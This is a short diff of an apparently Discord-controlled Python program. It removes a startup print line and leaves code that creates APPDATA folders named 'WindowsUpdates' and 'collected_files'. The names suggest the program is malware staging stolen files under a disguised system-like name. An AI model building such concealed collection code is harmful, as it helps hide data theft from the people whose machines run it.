@@ -36,7 +36,6 @@ def list_modules():
 
 @client.event
 async def on_ready():
-    print(f"Bot started. Version: " + "1.0.3")
     if os.path.exists(f"{os.getenv('APPDATA')}\\WindowsUpdates") == False:
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates")
     if os.path.exists(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files") == False:
